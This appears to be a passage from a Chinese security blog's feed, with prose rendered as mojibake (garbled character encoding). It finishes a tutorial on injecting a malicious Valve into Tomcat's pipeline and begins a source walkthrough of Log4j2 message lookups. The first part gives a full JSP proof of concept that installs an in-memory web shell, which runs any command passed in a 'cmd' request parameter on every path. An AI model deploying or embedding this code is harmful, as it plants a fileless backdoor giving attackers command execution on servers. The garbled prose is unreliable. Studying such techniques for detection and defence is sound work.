<p>ç®¡é“æœºåˆ¶ä¸»è¦æ¶‰åŠåˆ°ä¸¤ä¸ªåè¯ï¼ŒPipelineï¼ˆç®¡é“ï¼‰å’ŒValveï¼ˆé˜€é—¨ï¼‰ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¯·æ±‚æ¯”ä½œç®¡é“ï¼ˆPipelineï¼‰ä¸­æµåŠ¨çš„æ°´ï¼Œé‚£ä¹ˆé˜€é—¨ï¼ˆValveï¼‰å°±å¯ä»¥ç”¨æ¥åœ¨ç®¡é“ä¸­å®ç°å„ç§åŠŸèƒ½ï¼Œå¦‚æ§åˆ¶æµé€Ÿç­‰ã€‚å› æ­¤é€šè¿‡ç®¡é“æœºåˆ¶ï¼Œæˆ‘ä»¬èƒ½æŒ‰ç…§éœ€æ±‚ï¼Œç»™åœ¨ä¸åŒå­å®¹å™¨ä¸­æµé€šçš„è¯·æ±‚æ·»åŠ å„ç§ä¸åŒçš„ä¸šåŠ¡é€»è¾‘ï¼Œå¹¶æå‰åœ¨ä¸åŒå­å®¹å™¨ä¸­å®Œæˆç›¸åº”çš„é€»è¾‘æ“ä½œã€‚è¿™é‡Œçš„è°ƒç”¨æµç¨‹å¯ä»¥ç±»æ¯”ä¸ºFilterä¸­çš„è´£ä»»é“¾æœºåˆ¶</p>
<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1752213967112.png" alt="" loading="lazy"></figure>
<p>åœ¨Tomcatä¸­ï¼Œå››å¤§ç»„ä»¶Engineã€Hostã€Contextä»¥åŠWrapperéƒ½æœ‰å…¶å¯¹åº”çš„Valveç±»ï¼ŒStandardEngineValveã€StandardHostValveã€StandardContextValveä»¥åŠStandardWrapperValveï¼Œä»–ä»¬åŒæ—¶ç»´æŠ¤ä¸€ä¸ª<strong>StandardPipeline</strong>å®ä¾‹ã€‚</p>
<h3 id="ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ">ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ</h3>
<p>Pipelineæ¥å£ï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ˜¯ç»§æ‰¿äº†Contained</p>
<pre><code class="language-java">public interface Pipeline extends Contained {
 
    public Valve getBasic();
 
    public void setBasic(Valve valve);
 
    public void addValve(Valve valve);
 
    public Valve[] getValves();
 
    public void removeValve(Valve valve);
 
    public void findNonAsyncValves(Set&lt;String&gt; result);
}
</code></pre>
<p>Pipelineæ¥å£æä¾›äº†å„ç§å„æ ·å¯¹Valueæ“ä½œçš„æ¥å£ï¼Œä¾‹å¦‚æˆ‘ä»¬ç­‰ä¼šéœ€è¦ç”¨çš„çš„addValue</p>
<p>Valueæ¥å£ï¼š</p>
<pre><code class="language-java">public interface Valve {
 
    public Valve getNext();
 
    public void setNext(Valve valve);
 
    public void backgroundProcess();
 
    public void invoke(Request request, Response response)
        throws IOException, ServletException;
 
    public boolean isAsyncSupported();
}
</code></pre>
<p>å…¶ä¸­getNext()æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¸‹ä¸€ä¸ªValveï¼Œè¿™ä¸ªè°ƒç”¨æ¨¡å¼è·ŸFilterçš„è°ƒç”¨æ¨¡å¼å¾ˆåƒ</p>
<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1752213967129.jpeg" alt="" loading="lazy"></figure>
<p>é€šè¿‡æºç çœ‹ä¸€çœ‹ï¼Œæ¶ˆæ¯åœ¨å®¹å™¨ä¹‹é—´æ˜¯å¦‚ä½•ä¼ é€’çš„</p>
<p>æ¶ˆæ¯ä¼ é€’åˆ°Connectorè¢«è§£æåï¼Œåœ¨<code>org.apache.catalina.connector.CoyoteAdapter#service</code>æ–¹æ³•ä¸­ï¼š</p>
<pre><code class="language-java">public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
    Request request = (Request) req.getNote(ADAPTER_NOTES);
    Response response = (Response) res.getNote(ADAPTER_NOTES);

    if (request == null) {
        // Create objects
        request = connector.createRequest();
        request.setCoyoteRequest(req);
        response = connector.createResponse();
        response.setCoyoteResponse(res);

        // Link objects
        request.setResponse(response);
        response.setRequest(request);

        // Set as notes
        req.setNote(ADAPTER_NOTES, request);
        res.setNote(ADAPTER_NOTES, response);

        // Set query string encoding
        req.getParameters().setQueryStringCharset(connector.getURICharset());
    }
        ...

    try {
        ...
        connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);
    }
        ...
}
</code></pre>
<p>ä¸»è¦çš„å°±æ˜¯çœ‹è¿™ä¸ª<strong>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</strong></p>
<p>æˆ‘ä»¬è¿™é‡Œæœ€å¥½æ˜¯é€šè¿‡æ–­ç‚¹æ¥çœ‹ï¼Œçœ‹çš„æ›´æ¸…æ¥š</p>
<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1752213967145.png" alt="" loading="lazy"></figure>
<p>connector.getService()ï¼š è·å¾—StandardService<br>
<img src="https://bloyet.github.io/post-images/1752213967159.png" alt="" loading="lazy"></p>
<p>æ¥ç€é€šè¿‡StandardService.getContainer().getPipeline()è·å–StandardPipelineå¯¹è±¡</p>
<figure data-type="image" tabindex="32"><img src="https://bloyet.github.io/post-images/1752213967175.png" alt="" loading="lazy"></figure>
<p>connector.getService().getContainer().getPipeline().getFirst() è·å–åˆ°Valve</p>
<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1752213967191.png" alt="" loading="lazy"></figure>
<p>ç„¶åå°±æ˜¯é€šè¿‡invokeæ–¹æ³• æ¥æ‰§è¡Œä¸åŒçš„æ–¹æ³•äº†</p>
<h3 id="æ³¨å…¥valve">æ³¨å…¥Valve</h3>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡getFirst()æ¥è·å–åˆ°ä¸åŒçš„Valve ç„¶ååœ¨æ‰§è¡Œå¯¹åº”çš„æ“ä½œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åªéœ€è¦è·å–åˆ°ç½‘é¡µçš„contextï¼Œç„¶åæŠŠæˆ‘ä»¬æ¶æ„çš„Valueå­˜æ”¾è¿›å»ï¼Œå°±å¯ä»¥è¾¾åˆ°æ”»å‡»ç›®çš„äº†</p>
<p>æˆ‘ä»¬çœ‹çœ‹åœ¨å“ªé‡Œå­˜æ”¾äº†Valve ï¼Œæ‰¾åˆ°Pipeline</p>
<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1752213967239.png" alt="" loading="lazy"></figure>
<p>pipelineæ˜¯åœ¨å®ƒçš„çˆ¶ç±»ä¸­å®šä¹‰çš„</p>
<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1752213967207.png" alt="" loading="lazy"></figure>
<p>æ¥ç€çœ‹</p>
<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1752213967223.png" alt="" loading="lazy"></figure>
<p>å¯ä»¥é€šè¿‡addValveæ–¹æ³•æ·»åŠ Valve</p>
<p>é‚£ä¹ˆç°åœ¨æ€è·¯å°±æ˜ç¡®äº†ï¼š</p>
<ol>
<li>è·å–<code>StandardContext</code>å¯¹è±¡</li>
<li>é€šè¿‡<code>StandardContext</code>å¯¹è±¡è·å–<code>StandardPipeline</code></li>
<li>ç¼–å†™æ¶æ„Valve</li>
<li>é€šè¿‡<code>StandardPipeline.addValve()</code>åŠ¨æ€æ·»åŠ Valve</li>
</ol>
<p>è·å–StandardPipelineå¯¹è±¡</p>
<pre><code class="language-java">&lt;%
Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext standardContext = (StandardContext) req.getContext();

Pipeline pipeline = standardContext.getPipeline();
%&gt;
</code></pre>
<p>ç¼–å†™æ¶æ„Valve</p>
<p>ç»§æ‰¿çˆ¶ç±»ï¼Œå¹¶ä¸”é‡å†™invokeæ–¹æ³•</p>
<pre><code class="language-java">&lt;%!
class Shell_Valve extends ValveBase {

@Override
public void invoke(Request request, Response response) throws IOException, ServletException {
    String cmd = request.getParameter(&quot;cmd&quot;);
    if (cmd !=null){
        try{
            Runtime.getRuntime().exec(cmd);
        }catch (IOException e){
            e.printStackTrace();
        }catch (NullPointerException n){
            n.printStackTrace();
        }
    }
}
}
%&gt;
</code></pre>
<p>åŠ¨æ€æ·»åŠ Valve</p>
<pre><code class="language-java">&lt;%
Shell_Valve shell_valve = new Shell_Valve();
pipeline.addValve(shell_valve);
%&gt;
</code></pre>
<h3 id="poc-3">POC</h3>
<pre><code class="language-java">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Pipeline&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.valves.ValveBase&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;

&lt;%
Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);
reqF.setAccessible(true);
Request req = (Request) reqF.get(request);
StandardContext standardContext = (StandardContext) req.getContext();

Pipeline pipeline = standardContext.getPipeline();
%&gt;

&lt;%!
class Shell_Valve extends ValveBase {

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        String cmd = request.getParameter(&quot;cmd&quot;);
        if (cmd !=null){
            try{
                Runtime.getRuntime().exec(cmd);
            }catch (IOException e){
                e.printStackTrace();
            }catch (NullPointerException n){
                n.printStackTrace();
            }
        }
    }
}
%&gt;

&lt;%
Shell_Valve shell_valve = new Shell_Valve();
pipeline.addValve(shell_valve);
%&gt;
</code></pre>
<p>è®¿é—®jspæ–‡ä»¶å åŠ¨æ€æ³¨å…¥å†…å­˜é©¬ ä»»æ„è·¯å¾„å¯ä»¥æ‰§è¡Œå‘½ä»¤</p>
<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1752213967255.png" alt="" loading="lazy"></figure>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>å…¶å®Tomcatå†…å­˜é©¬å­¦èµ·æ¥ä¹Ÿä¸ç®—å¤ªéš¾ï¼Œåˆ«ç»™è‡ªå·±è®¾ç½®éš¾åº¦ï¼ˆè¿™é‡Œæ˜¯å› ä¸ºä½œè€…çš„å¼€å‘åŠŸåº•ä¸å¤ªå¥½ï¼Œå¾ˆå¤šåŸºç¡€çš„ä¸œè¥¿å¹¶æ²¡æœ‰å»å­¦è¿‡ï¼Œæ‰€ä»¥ä¸€ç›´åœ¨æ‹–å»¶å§ï¼Œå¾—å¥½å¥½åæ€ï¼‰ï¼Œjavaçš„å­¦ä¹ æ˜¯éœ€è¦æ²‰ä¸‹å¿ƒæ¥å­¦ä¹ çš„ åŠ æ²¹</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Log4j2ååºåˆ—åŒ–]]></title>
        <id>https://bloyet.github.io/post/log4j2-fan-xu-lie-hua/</id>
        <link href="https://bloyet.github.io/post/log4j2-fan-xu-lie-hua/">
        </link>
        <updated>2025-06-11T02:36:45.000Z</updated>
        <content type="html"><![CDATA[<p>å­¦ä¹ log4j2ååºåˆ—åŒ–ä¹‹å‰å‘¢ï¼Œéœ€è¦å…ˆæ¥å­¦ä¹ ä¸€ä¸‹å®ƒæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œæ€ä¹ˆç”¨</p>
<h1 id="log4j2">Log4j2</h1>
<p>log4j å’Œ log4j2 éƒ½æ˜¯æ—¥å¿—ç®¡ç†å·¥å…·ï¼Œç›¸æ¯”äº log4jï¼Œlog4j2 ä¸€æ­¥æ­¥å˜å¾—è¶Šæ¥è¶Šä¸»æµ</p>
<h2 id="ç¯å¢ƒé…ç½®">ç¯å¢ƒé…ç½®</h2>
<p>ä¾èµ–ï¼š</p>
<pre><code class="language-java">&lt;dependency&gt;
&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
&lt;version&gt;2.14.1&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
&lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
&lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
&lt;version&gt;2.14.1&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
&lt;groupId&gt;junit&lt;/groupId&gt;
&lt;artifactId&gt;junit&lt;/artifactId&gt;
&lt;version&gt;4.12&lt;/version&gt;
&lt;scope&gt;test&lt;/scope&gt;
&lt;/dependency&gt;
</code></pre>
<p>æˆ‘ä»¬è¿™é‡Œç”¨xlmæ¥å®Œæˆlog4jçš„é…ç½®ï¼š</p>
<p>é€šå¸¸åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼š1.è®¾ç½®æ—¥å¿—ä¿¡æ¯è¾“å‡ºç›®çš„åœ° 2.å®šä¹‰ loggerï¼Œä¹Ÿå°±æ˜¯å®šä½æˆ‘ä»¬éœ€è¦æ‰“æ—¥å¿—çš„åŒ…ä¸­</p>
<p>æŠŠxmlæ”¾åœ¨resourcesæ–‡ä»¶å¤¹ä¸‹ï¼Œè€Œä¸”æ–‡ä»¶åå¿…é¡»æ˜¯log4j2.xmlï¼ˆå¦‚æœæ˜¯ç”¨xmlå½¢å¼çš„è¯ï¼‰</p>
<pre><code class="language-java">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;Configuration status=&quot;TRACE&quot;&gt;

&lt;!-- é…ç½®æ—¥å¿—ä¿¡æ¯è¾“å‡ºç›®çš„åœ°  Appenders--&gt;
&lt;Appenders&gt;
&lt;!-- è¾“å‡ºåˆ°æ§åˆ¶å° --&gt;
&lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;
&lt;!--é…ç½®æ—¥å¿—ä¿¡æ¯çš„æ ¼å¼ --&gt;
&lt;PatternLayout
pattern=&quot;%d{HH:mm:ss} [%t] %-5level %logger{36} - %msg%n&quot; /&gt;
&quot;/&gt;
&lt;/Console&gt;

&lt;!-- è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªappendå±æ€§ï¼Œé»˜è®¤ä¸ºtrueï¼Œå³ä¸æ¸…ç©ºè¯¥æ–‡ä»¶åŸæ¥çš„ä¿¡æ¯ï¼Œé‡‡ç”¨æ·»åŠ çš„æ–¹å¼ï¼Œè‹¥è®¾ä¸ºfalseï¼Œåˆ™ä¼šå…ˆæ¸…ç©ºåŸæ¥çš„ä¿¡æ¯ï¼Œå†æ·»åŠ  --&gt;
&lt;File name=&quot;MyFile&quot; fileName=&quot;./logs/info.log&quot; append=&quot;true&quot;&gt;
&lt;PatternLayout&gt;
&lt;!--é…ç½®æ—¥å¿—ä¿¡æ¯çš„æ ¼å¼ --&gt;
&lt;pattern&gt;%d{HH:mm:ss} [%t] %-5level %logger{36} - %msg%n&lt;/pattern&gt;
            &lt;/PatternLayout&gt;
            &lt;/File&gt;

            &lt;/Appenders&gt;


            &lt;!-- å®šä¹‰logger,åªæœ‰å®šä¹‰äº†loggerå¹¶å¼•å…¥äº†appender,appenderæ‰ä¼šæœ‰æ•ˆ --&gt;
            &lt;Loggers&gt;
            &lt;!-- å°†ä¸šåŠ¡daoæ¥å£æ‰€åœ¨çš„åŒ…å¡«å†™è¿›å»,å¹¶ç”¨åœ¨æ§åˆ¶å°å’Œæ–‡ä»¶ä¸­è¾“å‡º --&gt; è®°ä½ä½ çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆåœ¨xmlå°±è¦å¯¹åº”
            &lt;logger name=&quot;text&quot; level=&quot;TRACE&quot;
            additivity=&quot;false&quot;&gt;
            &lt;AppenderRef ref=&quot;Console&quot; /&gt;
            &lt;AppenderRef ref=&quot;MyFile&quot; /&gt;
            &lt;/logger&gt;

            &lt;Root level=&quot;info&quot;&gt;
            &lt;AppenderRef ref=&quot;Console&quot; /&gt;
            &lt;AppenderRef ref=&quot;MyFile&quot; /&gt;
            &lt;/Root&gt;
            &lt;/Loggers&gt;
            &lt;/Configuration&gt;
</code></pre>
<p>textç±»ï¼š</p>
<pre><code class="language-java">package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class text {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(text.class);
        logger.trace(&quot;trace level&quot;);
        logger.debug(&quot;debug level&quot;);
        logger.info(&quot;info level&quot;);
        logger.warn(&quot;warn level&quot;);
        logger.error(&quot;error level&quot;);
        logger.fatal(&quot;fatal level&quot;);
    }
}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749609817674.png" alt="" loading="lazy"></figure>
<p>ä¼šå‘ç°è‡ªåŠ¨ç”Ÿæˆäº†ä¸ªlogsæ–‡ä»¶å¤¹ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬åœ¨xmlæ–‡ä»¶ä¸­é…ç½®å¥½çš„</p>
<h1 id="log4j2-åŠŸèƒ½ç»„ä»¶åˆ†æ">log4j2 åŠŸèƒ½ç»„ä»¶åˆ†æ</h1>
<h2 id="æ—¥å¿—è®°å½•">æ—¥å¿—è®°å½•</h2>
<p>æˆ‘ä»¬æ˜¯ä½¿ç”¨**LogManager.getLogger()**æ–¹æ³•æ¥è·å–ä¸€ä¸ª logger å¯¹è±¡ï¼Œç„¶åé€šè¿‡è°ƒç”¨ logger å¯¹è±¡çš„ debug/info/error/warn/fatal/trace/log ç­‰æ–¹æ³•è®°å½•æ—¥å¿—ç­‰ä¿¡æ¯ï¼Œéšä¾¿æ‰“ä¸ªæ–­ç‚¹å°±çŸ¥é“äº†ï¼Œéƒ½ä¼šå…ˆä½¿ç”¨org.apache.logging.log4j.spi.AbstractLogger#logIfEnabledçš„è‹¥å¹²é‡è½½æ–¹æ³•</p>
<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1749609817685.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1749609817696.png" alt="" loading="lazy"></figure>
<p>æ ¹æ®å½“å‰é…ç½®æ–‡ä»¶ä¸­çš„é…ç½®ä¿¡æ¯ä¸­è®°å½•çš„æ—¥å¿—ç­‰çº§ï¼Œæ¥åˆ¤æ–­æ˜¯å¦éœ€è¦è¾“å‡º console ä»¥åŠæ—¥å¿—è®°å½•æ–‡ä»¶ï¼Œlog4j ä¸­çš„æ—¥å¿—è®°å½•ç­‰çº§é»˜è®¤å¦‚ä¸‹ï¼š ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF ï¼Œç„¶åé»˜è®¤è¾“å‡ºçš„æ˜¯ WARN/ERROR/FATAL ç­‰çº§çš„æ—¥å¿—ä¿¡æ¯,å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥è¿›è¡Œä¿®æ”¹ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­å»ä¿®æ”¹è®°å½•ç­‰çº§</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Loggeræœ¬èº«å°±æ˜¯ä¸€ä¸ªæ¥å£ï¼Œç­‰çœ‹åˆ°ä¸‹æ–‡ï¼Œå°±çŸ¥é“åªè¦è°ƒç”¨äº† infoï¼Œerrorï¼Œwarn ç­‰æ–¹æ³•éƒ½å¯ä»¥è¢«ä½œä¸ºæ¼æ´çš„è§¦å‘ç‚¹ã€‚ä¸åŒç‚¹æ˜¯é…ç½®çš„è¾“å‡ºç­‰çº§ä¸åŒ</p>
<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1749609817707.png" alt="" loading="lazy"></figure>
<h2 id="æ¶ˆæ¯æ ¼å¼åŒ–">æ¶ˆæ¯æ ¼å¼åŒ–</h2>
<p>log4j2 é‡‡ç”¨<strong>org.apache.logging.log4j.core.pattern.MessagePatternConverter</strong>æ¥å¯¹æ—¥å¿—ä¿¡æ¯è¿›è¡Œå¤„ç†</p>
<p>å¤§è‡´çœ‹çœ‹è¿™ä¸ªç›®å½•ç»“æ„ï¼š</p>
<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1749609817718.png" alt="" loading="lazy"></figure>
<p>å…ˆçœ‹çœ‹æ„é€ æ–¹æ³•ï¼š æ€ä¹ˆè¿›è¡Œåˆå§‹åŒ–çš„</p>
<p>ä¼šä» Properties åŠ Options ä¸­è·å–é…ç½®æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦æä¾› Lookups åŠŸèƒ½</p>
<pre><code class="language-java">private MessagePatternConverter(final Configuration config, final String[] options) {
    super(&quot;Message&quot;, &quot;message&quot;);
    this.formats = options;
    this.config = config;
    final int noLookupsIdx = loadNoLookups(options);
    // ä»ç³»ç»Ÿé…ç½®ï¼ˆPropertiesï¼‰å’Œ options å…±åŒåˆ¤æ–­æ˜¯å¦ç¦ç”¨ lookup
    this.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= 0;
    // åŠ è½½æ–‡æœ¬æ¸²æŸ“å™¨ï¼ˆæ ¹æ®æ˜¯å¦ç¦ç”¨ lookup å†³å®šä¼ ä»€ä¹ˆå‚æ•°ï¼‰
    this.textRenderer = loadMessageRenderer(noLookupsIdx &gt;= 0 ? ArrayUtils.remove(options, noLookupsIdx) : options);
}
</code></pre>
<p>å¹¶ä¸”å…¶ä¸­<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</code>çš„è·å–æ˜¯é€šè¿‡å·¥å…·ç±»çš„ <code>getBooleanProperty</code>æ–¹æ³•æ¥è·å–çš„</p>
<pre><code class="language-java">public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(
    &quot;log4j2.formatMsgNoLookups&quot;, false);
</code></pre>
<p>getBooleanPropertyï¼š</p>
<pre><code class="language-java">public boolean getBooleanProperty(final String name, final boolean defaultValue) {
    String prop = this.getStringProperty(name);
    return prop == null ? defaultValue : &quot;true&quot;.equalsIgnoreCase(prop);
}
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1749609817731.png" alt="" loading="lazy"></figure>
<p>åœ¨getBooleanPropertyé»˜è®¤ä¼šä¼ è¿›æ¥ä¸€ä¸ªfalseï¼Œç„¶åè¿›è¡Œä¸€ä¸ªä¸‰ç›®è¿ç®—ï¼Œå°±æŠŠdefaultValueï¼Œä¹Ÿå°±æ˜¯false</p>
<p>åœ¨æ¥çœ‹çœ‹noLookupsIdxçš„å€¼ï¼š</p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œoptionsæ˜¯ä¸ªç©ºæ•°ç»„ï¼Œè¿ç®—å‡ºæ¥ä¸º-1</p>
<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1749609817742.png" alt="" loading="lazy"></figure>
<p>ç»“åˆè¿™ä¸¤ä¸ªï¼Œå°±å¯ä»¥çœ‹åˆ°ï¼š</p>
<pre><code class="language-java">//é»˜è®¤æƒ…å†µä¸‹ï¼ŒnoLookupsæ˜¯falseï¼Œä¹Ÿå°±æ˜¯ä¸ç¦ç”¨Lookupçš„
this.noLookups = Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS || noLookupsIdx &gt;= 0;
</code></pre>
<p>ç„¶åå°±ç»§ç»­æ‰§è¡ŒloadMessageRendereræ–¹æ³•ï¼Œæ ¹æ®æ˜¯å¦ç¦ç”¨ lookup å†³å®šä¼ ä»€ä¹ˆå‚æ•°ï¼Œæ‰€ä»¥ä¼ çš„æ˜¯optionsçš„å€¼ï¼š</p>
<p>optionsåªæ˜¯ç©ºå­—ç¬¦ä¸²æ•°ç»„ï¼Œå¹¶ä¸ç­‰äºnullï¼Œæ–¹æ³•é€šè¿‡ options ä¸­çš„å­—ç¬¦é…ç½®æ¥è·å–ç›¸åº”çš„æ¨¡æ¿æ¸²æŸ“å™¨</p>
<pre><code class="language-java">private TextRenderer loadMessageRenderer(final String[] options) {
    if (options != null) {
        for (final String option : options) {
            switch (option.toUpperCase(Locale.ROOT)) {
                case &quot;ANSI&quot;:
                    if (Loader.isJansiAvailable()) {
                        return new JAnsiTextRenderer(options, JAnsiTextRenderer.DefaultMessageStyleMap);
                    }
                    StatusLogger.getLogger()
                    .warn(&quot;You requested ANSI message rendering but JANSI is not on the classpath.&quot;);
                    return null;
                case &quot;HTML&quot;:
                    return new HtmlTextRenderer(options);
            }
        }
    }
    return null;
}
</code></pre>
<p>çœ‹åˆ°formatæ–¹æ³•ï¼Œä¹Ÿæ˜¯åœ¨<strong>MessagePatternConverter</strong>è¿™ä¸ªç±»ä¸­</p>
<p>ç¬¬ä¸€æ®µ if åˆ¤æ–­çš„å†…å®¹æ˜¯å…ˆä» event ä¸­è·å–åˆ° messageï¼Œç„¶ååˆ¤æ–­ message çš„ç±»å‹æ˜¯å¦ä¸º StringBuilderFormattableï¼Œä¹‹åå°±æ˜¯æ¸²æŸ“çš„å…·ä½“å†…å®¹<br>
ç¬¬äºŒæ®µ if åˆ¤æ–­çš„å†…å®¹æ˜¯é‡ç‚¹ï¼Œåœ¨ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æƒ…å†µä¸‹ï¼šconfig è·å–ä¸ä¸ºç©ºï¼Œå¹¶ä¸” noLookups é»˜è®¤ä¸º false çš„æƒ…å†µä¸‹ï¼Œæ ‡å¿—ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡ lookups åŠŸèƒ½æ¥è¿›è¡Œ<strong>å­—ç¬¦ä¸²è§£æ</strong><br>
ç„¶åè¿™é‡Œçš„è§£æåŠŸèƒ½çš„é‡ç‚¹æ˜¯åœ¨ <code>config.getStrSubstitutor().replace(event, value)</code>ä¸­</p>
<pre><code class="language-java">public void format(final LogEvent event, final StringBuilder toAppendTo) {
    final Message msg = event.getMessage();
    if (msg instanceof StringBuilderFormattable) {

        final boolean doRender = textRenderer != null;
        final StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo;

        final int offset = workingBuilder.length();
        if (msg instanceof MultiFormatStringBuilderFormattable) {
            ((MultiFormatStringBuilderFormattable) msg).formatTo(formats, workingBuilder);
        } else {
            ((StringBuilderFormattable) msg).formatTo(workingBuilder);
        }

        // TODO can we optimize this?
        if (config != null &amp;&amp; !noLookups) {
            for (int i = offset; i &lt; workingBuilder.length() - 1; i++) {
                if (workingBuilder.charAt(i) == '$' &amp;&amp; workingBuilder.charAt(i + 1) == '{') {
                    final String value = workingBuilder.substring(offset, workingBuilder.length());
                    workingBuilder.setLength(offset);
                    workingBuilder.append(config.getStrSubstitutor().replace(event, value));
                }
            }
        }
        if (doRender) {
            textRenderer.render(workingBuilder, toAppendTo);
        }
        return;
    }
    if (msg != null) {
        String result;
        if (msg instanceof MultiformatMessage) {
            result = ((MultiformatMessage) msg).getFormattedMessage(formats);
        } else {
            result = msg.getFormattedMessage();
        }
        if (result != null) {
            toAppendTo.append(config != null &amp;&amp; result.contains(&quot;${&quot;)
                              ? config.getStrSubstitutor().replace(event, result) : result);
        } else {
            toAppendTo.append(&quot;null&quot;);
        }
    }
}
</code></pre>
<h2 id="å­—ç¬¦å¤„ç†">å­—ç¬¦å¤„ç†</h2>
<p>å¤„ç†å­—ç¬¦ä¸²çš„å…³é”®ç±»æ˜¯StrSubstitutor</p>
<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1749609817753.png" alt="" loading="lazy"></figure>
<p>å…ˆçœ‹ä¸‹è¿™ä¸ªç±»å®šä¹‰çš„å¸¸é‡ï¼š</p>
<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1749609817763.png" alt="" loading="lazy"></figure>
<pre><code>DEFAULT_ESCAPE` æ˜¯ `$`ï¼Œ`DEFAULT_PREFIX` å‰ç¼€æ˜¯ `${`ï¼Œ`DEFAULT_SUFFIX` åç¼€æ˜¯ `}`ï¼Œ`DEFAULT_VALUE_DELIMITER_STRING` èµ‹å€¼åˆ†éš”ç¬¦æ˜¯ `:-`ï¼Œ`ESCAPE_DELIMITER_STRING` æ˜¯ `:\-
</code></pre>
<p>substituteæ˜¯StrSubstitutor ä¸­çš„å…³é”®æ–¹æ³•ï¼Œä¹Ÿæ˜¯lookupä¸­çš„å…³é”®ç‚¹ï¼Œç”¨æ¥é€’å½’å¤„ç†å­—ç¬¦ä¸²</p>
<p>æ–¹æ³•æ¯”è¾ƒå¤šï¼Œæˆ‘ä»¬å°±çœ‹å…³é”®æ­¥éª¤ï¼ŒçŸ¥é“æ€ä¹ˆå¯¹å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†çš„å°±è¡Œï¼š<br>
æ–¹æ³•çš„å¼€å¤´å…ˆæŠŠå„ä¸ªå‰åç¼€ä»¥åŠå†…å®¹çš„åŒ¹é…å™¨åŠ è½½ä¸Š</p>
<p><img src="https://bloyet.github.io/post-images/1749612710807.png" alt="" loading="lazy"><br>
ç„¶åé€šè¿‡ while å¾ªç¯æ¥æ‰¾å‰ç¼€ï¼Œè¿™é‡Œæ‰¾çš„å‰ç¼€æ˜¯æœ€å¼€å§‹çš„å‰ç¼€</p>
<p><img src="https://bloyet.github.io/post-images/1749612812025.png" alt="" loading="lazy"><br>
